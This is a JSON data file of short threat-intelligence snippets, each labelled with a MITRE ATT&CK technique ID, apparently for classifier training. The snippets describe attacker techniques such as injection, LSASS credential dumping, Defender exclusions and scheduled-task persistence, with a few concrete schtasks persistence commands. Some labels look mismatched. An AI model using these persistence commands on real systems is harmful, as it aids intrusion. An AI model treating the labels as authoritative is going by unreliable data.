    "text": "With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:  ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK  The last two methods in the chain carry out a majority of the first payload’s functionality",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used Registry run keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can search directories for files on the victims machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It’s also used to inject code into its target processes using the technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can collect system information including the OS version and domain on a compromised host.(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate files on a targeted system.(Citation: McAfee Babuk February 2021)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "threat actor used the Windows command-line arguments",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to download and activate additional modules for execution.(Citation: DigiTrust NanoCore Jan 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use DirectoryList to enumerate files in a specified directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Process Injection method",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has built in commands to identify a hosts IP address and find out other network configuration settings by viewing connected sessions.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used accounts with Delegated Administrator rights to access other O365 tenants",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPS for C2 communications.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: CERT-EE Gamaredon January 2021)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS for C2 network communications.(Citation: Talos Micropsia June 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware has used rundll32.exe to execute an initial infection process.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": ".]net via HTTP Get and POST metadata specified in the beacon's configuration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "executes BAT scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "stages collected data in a directory before exfiltration",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has staged stolen data locally on compromised hosts.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional components from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The OsInfo function in  collects the current running username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Name of the hardcoded directory where files are copied",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "\"cc.bat\" is a simple script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the IP address machine name and OS of the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "An  downloader uses the Windows command cmd.exe /C whoami. The group also uses a tool to execute commands on remote computers.(Citation: FireEye Operation Double Tap)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "malware has created Registry Run and RunOnce keys to establish persistence and has also added items to the Startup folder.(Citation: FireEye FIN7 April 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "download further malware payloads",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "copied all targeted files to a directory called index that was eventually uploaded to the C&C server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "copies itself into a running Internet Explorer process to evade detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used wmic.exe for local discovery information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to retrieve a list of files in a given directory as well as drives and drive types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use Rundll32.exe to enable C2 communication.(Citation: Crowdstrike Qakbot October 2020)(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot May 2021)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "wrote a registry run key for persistence",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "via the API\nNtCreateSection()",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI for execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can execute Lazagne as well as  using PowerShell.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "malware can download a remote access tool  and inject into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "extract sensitive information,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd.exe` to scan a compromised host for specific file extensions.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can search for a specific file on the compromised computer and can enumerate files in Desktop Downloads and Documents folders.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can execute remote commands using Windows Management Instrumentation.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can download and run batch files to execute commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "loaded using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The attackers may use RDP to move across the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "gathers the username from the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used various tools to download files including DGet (a similar tool to wget).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the actors manually disabled Windows Defender via the Graphical User Interface (GUI)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Manipulate files and directories (list",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect the MAC address and other information from a victim machine using `ipconfig/all`.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS to communicate with its C2 servers",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "relies on other parts of the HTTP request, including the Host header and the actual C2",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can upload additional files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download a file from and to a remote C2 server.(Citation: ESET TeleBots Oct 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has queued an APC routine to explorer.exe by calling ZwQueueApcThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "There are two approaches to using valid credentials to copy and execute the malware to a remote host:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "A  tool can create a new service naming it after the config information to gain persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor attempted to log in to the VPN using several user accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "a technique leveraging the Windows Management Instrumentation (WMI) service to execute malicious code.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Adversary browsed several locations to search for the data they were after.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a feature to disable Windows Task Manager.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has gained execution through users opening malicious attachments.(Citation: Trend Micro Qakbot May 2020)(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot May 2021)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The next stage, injected into iexplore.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The  dropper can place malicious payloads on targeted systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can identify the username on a compromised host.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims into opening weaponized documents fake external drives and fake antivirus to execute malicious payloads.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can use supplied user credentials to execute processes and stop services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents sent via email as part of spearphishing campaigns.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "downloads the payload from the Internet and executes on the target system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HTTP POST request (type 27 / data exfiltration).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Later implants used by  such as  use a blend of HTTP HTTPS and other legitimate channels for C2 depending on module configuration.(Citation: FireEye APT28)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "service was installed in the system",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can use multiple Windows API calls for actions on compromised hosts including discovery and execution.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used the Farse6.1 utility (based on ) to extract credentials from lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "executes systeminfo after initial communication is made to the remote server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP in C2 communications.(Citation: IBM Grandoreiro April 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get detailed information about a compromised host including the operating system version patches hotfixes and service packs.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "reflective DLL loading, to inject a DLL from memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the MAC address on an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has deleted the filepath %APPDATA%\\Intel\\devmonsrv.exe.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "threat actor(s) made sure to add more paths and folders to Windows Defender exclusion including %TEMP% and C:\\Windows\\* as well as adding .ps1 (PowerShell) extension to the exclusion list.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The two \".bat\" files that were sent",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses other tools to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP for lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "the scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can modify the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Most of the PowerShell commands would call Windows Management Instrumentation (WMI)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to enable lateral movement using DCOM.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a Process Watcher feature to monitor processes in case the client ever crashes or gets closed.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate processes on a targeted system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate attached drives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has collected data from a compromised network.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used get_tasklist to discover processes on the compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to establish C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn mysc /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru System.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "OS version information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload and download files to and from an infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Inject malicious code into legitimate processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has been known to establish persistence by adding programs to the Run Registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP GET to request and pull information from C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used Powershell to download UltraVNC and  from third-party file sharing sites.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has collected files from victim machines including certificates and cookies.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence via the `HKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\run` registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can list files on available disk volumes.(Citation: Securelist Dtrack)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "malware has obtained the victim username and sent it to the C2 server.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "malware can create a .lnk file and add a Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP and HTTPS over ports 80 and 443 in C2 communications.(Citation: Cybereason Bazar July 2020)(Citation: NCC Group Team9 June 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "copied and installed tools for operations once in the victim environment.(Citation: US-CERT TA18-074A)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to modify the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64 to store information regarding the C2 server and downloads.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used a variety of Windows API calls including `GetComputerNameA` `GetUserNameA` and `CreateProcessA`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP POST for C2.(Citation: Talos Konni May 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The task is used to start an IronPython script",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "the adversary copying results of the discovery phase, like file- and directory lists from local systems,",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "executes a bash script to establish a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor was able to RDP unencumbered across the organization’s infrastructure.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "When it first starts  crawls the victim's local drives and collects documents with the following extensions: .doc .docx .pdf .ppt .pptx and .txt.(Citation: Forcepoint Monsoon)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to execute commands on an infected host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has injected into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "using FindFirstFileW, FindNextFileW, and FindClose APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can gather information about the host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to delete files and scripts from the victim's machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can start a remote shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "began with an actor signing into an internal user’s Microsoft 365 account from a VPN",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by creating a shortcut in the current user's Startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "creating the registry key",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "A  tool can read and decrypt stored Registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated hosts gathering username machine name and administrative permissions information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can gather information regarding the user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has changed the Startup folder to the one containing its executable by overwriting the registry keys.(Citation: Korean FSI TA505 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "it was executed using a command line argument",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used trojanized Microsoft Word documents sent via email which prompted the victim to enable macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "With some further process injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "used cmd.exe to execute commands on remote machines.(Citation: Volexity SolarWinds)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can issue SOAP requests to delete already processed C2 emails.  can also delete itself from the infected system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "used HTTPS reverse proxies to redirect C2 traffic",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can achieve persistence by modifying Registry key entries. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can upload logs and other data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "a batch script or a specially crafted command line script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP in communication with the C2.(Citation: Anomali Pirate Panda April 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "searches for files on the system. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used scheduled tasks to download backdoor tools. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "used Windows API functions such as MoveFileEx and NtQueryInformationProcess as part of the  injection process. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to execute commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The  trojan supports file deletion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can execute getinfo to identify the username on a compromised host.(Citation: BlackBerry CostaRicto November 2020)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Adds the following exclusions to Windows DefenderExtensions",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence with the auto start function including using the value `EverNoteTrayUService`.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "systeminfo.exe",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used first-stage payloads that download additional malware from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A  tool can spawn svchost.exe and inject the payload into that process.(Citation: Nccgroup Emissary Panda May 2018)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used prodump to dump credentials from LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers the name of the local host version of GNU Compiler Collection (GCC) and the system information about the CPU machine and operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of user accounts from a victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can transfer files from the victim machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "enumerating the processes’ threads,",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can execute ProcessList for process discovery.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "threat actors proceeded to run the net commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate common folders such as My Documents Desktop and AppData.(Citation: SentinelOne Hermetic Wiper February 2022)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "used to inject a new beacon or a specific program to another process on the victim’s computer.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the loader allocates memory within the current process and then loads the PE payload into it using the full PE loading procedure.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download files to the victims machine and execute them.(Citation: GitHub QuasarRAT)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the HTTPS beacon",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute commands through  on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has deleted Registry keys during post compromise cleanup activities.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "CMD-based scripts",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute code from remote servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve information from the infected machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload and download files to and from a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can add a new service to ensure  persists on the system when delivered as another payload onto the system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR  + path_file + /ST 09:30.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can gather a list of all processes running on a victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate processes on a target system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used CreateProcessW to create child processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has looked in the registry to find the default browser path.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through Word documents with malicious embedded macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the user account was known to have recently been abused by the threat actor",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the download and execution",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has stopped services related to anti-virus.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The  DLL has been injected reflectively into the memory of a legitimate running process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate information about files from the infected system including file size attributes creation time last access time and write time.  can enumerate the compilation timestamp of Windows executable files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name of a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "we can see one more HTTP request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the computer name from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Usernames",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has created staging folders in directories that were infrequently used by legitimate users or processes.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "deletes files to remove evidence on the machine. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
